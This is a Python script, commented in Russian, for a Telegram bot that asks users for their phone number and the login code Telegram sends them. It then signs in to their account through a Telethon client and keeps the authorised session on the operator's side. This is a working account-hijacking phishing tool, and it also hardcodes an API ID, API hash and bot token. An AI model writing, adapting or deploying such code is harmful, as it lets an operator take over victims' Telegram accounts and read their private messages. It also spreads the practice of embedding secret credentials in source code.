import asyncio
from telethon import TelegramClient
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram import Router
import os

# Конфигурация
api_id = "25330009"  # Ваш API ID
api_hash = "5e96e4d16e421a3961b7caef5f0ccb96"  # Ваш API Hash
BOT_TOKEN = "7280058903:AAGJZkeoNsHjlwRACHAXTBTZppPSXLkl1lM"  # Токен вашего бота
session_name = "MyClientSession"  # Имя сессии для клиента

# Удаление старого файла сессии для принудительного запроса кода
session_file = f"{session_name}.session"
if os.path.exists(session_file):
    os.remove(session_file)

# Инициализация бота и клиента
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
router = Router()
client = TelegramClient(session_name, api_id, api_hash)

# Словарь для хранения данных пользователей
user_data = {}


@router.message(Command("start"))
async def start(message: types.Message):
    user_id = message.from_user.id
    user_data[user_id] = {"stage": "waiting_for_phone_number"}
    await message.answer(
        "Привет! Пожалуйста, введите ваш номер телефона для авторизации:"
    )


@router.message()
async def handle_message(message: types.Message):
    user_id = message.from_user.id
    data = user_data.get(user_id, None)

    if data and data["stage"] == "waiting_for_phone_number":
        phone_number = message.text
        if phone_number.isdigit() and len(phone_number) >= 10:
            user_data[user_id] = {
                "phone_number": phone_number,
                "stage": "waiting_for_code",
            }
            try:
                await client.connect()
                if not await client.is_user_authorized():
                    print("Sending code request...")
                    # Отправляем запрос на код подтверждения
                    sent_code = await client.send_code_request(phone_number)
                    # Сохраняем hash кода для последующей авторизации
                    user_data[user_id]["phone_code_hash"] = sent_code.phone_code_hash
                    print("Code request sent.")
                await message.answer(
                    "Номер телефона принят. Пожалуйста, введите код подтверждения:"
                )
            except Exception as e:
                await message.answer(f"Ошибка при отправке кода: {e}")
        else:
            await message.answer("Некорректный номер телефона. Попробуйте снова.")

    elif data and data["stage"] == "waiting_for_code":
        phone_code = message.text
        phone_number = user_data[user_id].get("phone_number")
        phone_code_hash = user_data[user_id].get("phone_code_hash")

        try:
            # Используем номер телефона, код и hash для завершения авторизации
            await client.sign_in(
                phone_number, phone_code, phone_code_hash=phone_code_hash
            )
            # Проверяем успешную авторизацию
            me = await client.get_me()
            await message.answer(
                f"Пользователь с номером {phone_number} успешно авторизован! Привет, {me.first_name}."
            )
            user_data.pop(
                user_id, None
            )  # Удаление данных пользователя после успешной авторизации
        except Exception as e:
            await message.answer(f"Ошибка авторизации: {e}")
    else:
        await message.answer("Используйте команду /start для начала.")


async def main():
    print("Connecting client...")
    await client.connect()  # Используем connect вместо start
    print("Client connected.")

    # Настраиваем бота
    dp.include_router(router)
    await bot.delete_webhook()
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
